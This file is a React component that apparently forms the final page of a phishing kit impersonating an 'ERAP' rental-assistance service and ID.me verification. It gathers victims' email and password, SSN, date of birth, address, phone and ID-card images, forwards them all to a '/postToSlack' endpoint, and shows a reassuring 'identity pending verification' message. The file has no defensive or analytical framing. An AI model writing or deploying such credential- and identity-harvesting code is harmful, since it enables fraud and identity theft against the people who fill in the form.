import { useNavigate } from "react-router-dom";
import { useContext, useEffect, useState } from "react";

import { CardContent, CardFooter } from "@/components/ui/card.tsx";
import {
  isForm1Filled,
  isForm2Filled,
  isForm3Filled,
} from "@/lib/form-utils.ts";
import { FormContext } from "@/context/FormContext.tsx";
import { FORM_ROUTES } from "@/routes/form-routes.ts";

const LOG_DATA = true;

export default function FormSuccessPage() {
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [isError, setIsError] = useState(false);

  const formContext = useContext(FormContext);
  const navigate = useNavigate();

  useEffect(() => {
    document.title = "ERAP Service";
  }, []);

  useEffect(() => {
    const sendFormData = async () => {
      // Navigate back if the previous fields aren't filled
      if (
        !(
          isForm3Filled(formContext) &&
          isForm2Filled(formContext) &&
          isForm1Filled(formContext)
        )
      ) {
        return navigate(FORM_ROUTES.three);
      }

      setIsLoading(true);

      try {
        const { form1, form2, form3 } = formContext;
        const formData = new FormData();

        // Append form 1 data
        const { email, password } = form1;
        formData.append("email", email);
        formData.append("password", password);

        // Append form 2 data
        const {
          firstName,
          lastName,
          phone,
          ssn,
          homeAddress,
          city,
          state,
          zipCode,
          dateOfBirth,
        } = form2;
        formData.append("firstName", firstName);
        formData.append("lastName", lastName);
        formData.append("phone", phone);
        formData.append("ssn", ssn);
        formData.append("homeAddress", homeAddress);
        formData.append("city", city);
        formData.append("state", state);
        formData.append("zipCode", zipCode);
        formData.append("dateOfBirth", dateOfBirth);

        // Append form 3 data
        const { idFront, idBack } = form3;
        if (idFront) formData.append("idFront", idFront);
        if (idBack) formData.append("idBack", idBack);

        // Perform the API call
        const response = await fetch(
          `${import.meta.env.VITE_API_BASE_URL}/postToSlack`,
          {
            method: "POST",
            body: formData,
          }
        );

        if (!response.ok) {
          setIsError(true);
        } else {
          const data = await response.json();
          setIsSuccess(true);

          if (LOG_DATA) {
            const formattedResult = { ...data.files, ...data.form };
            console.log(formattedResult);
          }
        }
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      } catch (error: any) {
        console.error("Error handling request:", error.message);
        setIsError(true);
      } finally {
        setIsLoading(false);
      }
    };

    sendFormData();
  }, [formContext, navigate]);

  return (
    <>
      <CardContent
        className={
          "text-center flex flex-col align-center justify-center gap-y-14"
        }
      >
        <h1 className={"text-[#efd763] text-5xl font-bold"}>
          {isLoading && "Uploading"}
          {isSuccess && "Success"}
          {isError && "Error"}
        </h1>
        <p className={"text-[#00599c] font-semibold"}>
          {isLoading && (
            <>
              Data is being uploaded to the server!
              <br />
              Please do not close.
            </>
          )}
          {isError && (
            <>
              Unable to upload data!
              <br />
              Please try again.
            </>
          )}
          {isSuccess && (
            <>
              Your identity is pending verification.
              <br />
              We'll be in touch shortly!
            </>
          )}
        </p>
      </CardContent>
      <CardFooter className={"flex items-center mt-36 p-20 justify-center"}>
        <p className={"text-gray-500"}>
          What is ID.me? | Terms of Service | Privacy Policy
        </p>
      </CardFooter>
    </>
  );
}
